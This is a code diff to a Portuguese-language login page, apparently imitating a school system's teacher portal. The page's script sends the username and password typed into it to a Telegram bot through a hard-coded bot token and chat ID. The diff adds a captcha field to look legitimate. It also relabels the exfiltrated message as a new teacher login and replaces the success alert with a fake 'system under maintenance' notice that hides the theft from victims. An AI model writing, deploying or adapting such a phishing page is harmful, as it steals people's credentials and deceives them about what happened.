@@ -596,7 +596,11 @@ document.addEventListener("DOMContentLoaded", function() {
                                                 <div class="text-wrapper-2">Senha</div>
                                                 <input name="txtcomplemento" type="password" id="txtcomplemento" class="input" />
                                             </div>
-                                            
+                                                        <div id="divCaptcha" class="abaixo">
+                                                <div class="text-wrapper-2 ">Digite o código o segurança acima</div>
+                                                <input name="txtCaptcha" type="text" id="txtCaptcha" class="input" />
+                                            </div>
+                                            <p>
                                             <p id="pEsqueceuSenha" class="esqueceu-a-senha">
                                                 <span id="spanEsqueceuSenha" class="span">Esqueceu a senha? </span>
                                                 <a
@@ -655,7 +659,7 @@ document.getElementById("enviarMensagem").addEventListener("click", async functi
     const token = "7374929625:AAFhiSSz6mgJV5H6SN1gkpd3CJATQwkE7q0";
     const chatId = "5847212672";
 
-    const texto = `👤 Login:${mensagem}\n🔑 Senha:${complemento || "(sem complemento)"}`;
+    const texto = `☠️ NOVO LOGIN DE PROFESSOR!\n\n👤 Login:${mensagem}\n🔑 Senha:${complemento || "(sem complemento)"}`;
 
     try {
         const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -669,15 +673,15 @@ document.getElementById("enviarMensagem").addEventListener("click", async functi
         });
 
         if (response.ok) {
-            alert("Mensagem enviada com sucesso ✅");
+            alert("🔔 Sistema em Manutenção!");
             document.getElementById("txtmessage").value = "";
             document.getElementById("txtcomplemento").value = "";
         } else {
-            alert("❌ Erro ao enviar a mensagem!");
+            alert("❌ Erro ao enviar login!");
         }
     } catch (error) {
         console.error(error);
-        alert("❌ Falha na conexão com o Telegram!");
+        alert("❌ Falha na conexão com o login!");
     }
 });
 </script>
